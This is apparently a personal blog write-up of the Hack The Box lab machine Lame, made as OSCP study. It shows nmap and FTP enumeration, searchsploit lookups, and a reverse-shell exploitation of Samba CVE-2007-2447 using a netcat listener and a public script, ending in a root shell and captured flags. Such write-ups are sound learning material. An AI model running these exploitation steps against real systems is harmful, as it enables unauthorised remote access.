---
layout: single
title: "HTB Lame Writeup"
date: 2023-04-24 12:08:00 -0600
categories: htb
tags:
  - htb
---

This first blog post feels like it needs some introduction and a little context as to why I am writing this. I have recently been studying for the OSCP and discovered [TJnull's OSCP-like list of HTB machines](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). I read this in some blog post, the best way to learn is to explain it yourself. That said, I have about 3 years of full-stack development experience and have participated in a number of CTFs as a hobby. Recently watching some [IppSec](https://www.youtube.com/@ippsec) made me want to just jump into some of these HTB machines. Rather than waiting to compelte the course and go through some OSCP labs, why not jump into these machines and struggle my way through them. I'm not afraid to ask for help and I want to do a deep dive into some concepts outside of the machine to mix it up and not feel like an average blog. All that said, lets jump into **Lame**, a machine I completed a couple weeks ago!

## Enumeration
Going into this machine was my first attempt at executing a lot of these commands so I will clean up some of the struggling to keep this straightforward. Lets start by performing an *nmap* scan with `-sC` for default scripts, `-sV` for version enumeration and write to a file for later revisiting. Generally I perform a top TCP scan while running a full TCP & UDP scan in the background and reference them later if they reveal any other relevant information.
{% highlight shell %}
pr1sm@kali:~$ sudo nmap -sC -sV -v 10.10.10.3 -oA lame

Nmap scan report for 10.10.10.3
Host is up (0.13s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

...

{% endhighlight %} 

The most obvious thing that jumped out to me from this result was the FTP server on TCP port 22 running allowing anonymous login. Lets login to this server and see if there is anything to see:
{% highlight shell %}
pr1sm@kali:~$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:pr1sm): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||28652|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
{% endhighlight %}

Nothing enumerated from the FTP server leads me to the SMB server that is running on the server. We should be able to enumerate some user info and other system information using *enum4linux*, a Windows SMB enumeration tool. Running this will take a little bit, so I started it and let it run in the background:
{% highlight bash %}
pr1sm@kali:~$ enum4linux -a 10.10.10.3
{% endhighlight %}

The next thought was to see if there were any known vulnerabilities for `vsftpd 2.3.4`, using searchsploit there were a couple hits:
{% highlight bash %}
pr1sm@kali:~$ searchsploit vsftpd 2.3.4
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution              | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb
------------------------------------------------------- ---------------------------------
{% endhighlight %}

In an attempt to keep this a little more brief, I spent about 20-30 minutes trying to exploit this vector. Potentially some configuration is keeping me from performing the exploit. Analyzing the script makes it look very simple and attempts at a manual exploit and a Metasploit attempt came up dry.

## Vulnerability
The next major service on the server is an SMB server running on *Samba 3.0.20*. Looking into known vulnerabilities with *searchsploit* gives a few results:
{% highlight shell %}
pr1sm@kali:~$ searchsploit Samba 3.0.20
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Comm | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                  | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)          | linux_x86/dos/36741.py
------------------------------------------------------- ---------------------------------
{% endhighlight %}

It seems like a heap overflow vulnerability for this service is exploitable. This would probably be very simple through Metasploit, but I personally find that a lot of critical thinking can be stripped by resorting to Metasploit and would rather understand the vulnerability a little more rather then just plug into Metasploit. Looking up the CVE of this vulnerability reveals `CVE-2007-2447`. I found a [script](https://github.com/amriunix/CVE-2007-2447) that can perform this exploit.

At some point I would like to be able to understand what exactly is happening hear, but some processing issue in the username field allows RCE on the server allowing to get a shell. Lets start buy listening for a shell on port `5000`
{% highlight bash %}
pr1sm@kali:~$ nc -lvp 5000
{% endhighlight %}

Now we can execute the script and see if we get a shell:
{% highlight bash %}
pr1sm@kali:~$ ./usermap_script.py 10.10.10.3 445 10.10.14.3 5000

[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
{% endhighlight %}

After waiting a few moments a connection has been made on our local shell!
{% highlight bash %}
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.3] 58952
whoami
root
{% endhighlight %}

From here, I'd like to upgrade the shell (at the time I wasn't very sure how to do it so I wanted to figure it out even if it wasn't required here). First we need to know if *python* or *python3* is in the `PATH`
{% highlight bash %}
which python
/usr/bin/python
{% endhighlight %}

Now we can run now spawn a *bash* shell with python:
{% highlight bash %}
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/#
{% endhighlight %}

At this point all we have to do is navigate and get the flags.
{% highlight bash %}
root@lame:/# cat /root/root.txt
0f3ba91a9e6bf9b3dae54e16c4d345b4
root@lame:/# cat /home/makis/user.txt
63cd83e01146eaaff864d7651ef5f908
{% endhighlight %}

## Conclusion
This box wasn't difficult in the sense that it was an advanced exploit, but I think it serves as a decent introduction to HTB machines and getting comfortable with tools. Althought the thought process is simple, originally exploiting this machine was difficult stumbling through commands and being able to string everything together. Especially the process of upgrading the shell, listening on ports, and idenitifying vulnerabilities. All of these were very basic tasks but it was a challenge to figure out the best way to do all of this. Going forward, I would like to do a small deep dive on a concept that I can expand my knowledge and hopefully help someone out. I hope as I write more of these they get a little more streamlined and polished, but I have to start somewhere. Until next time...
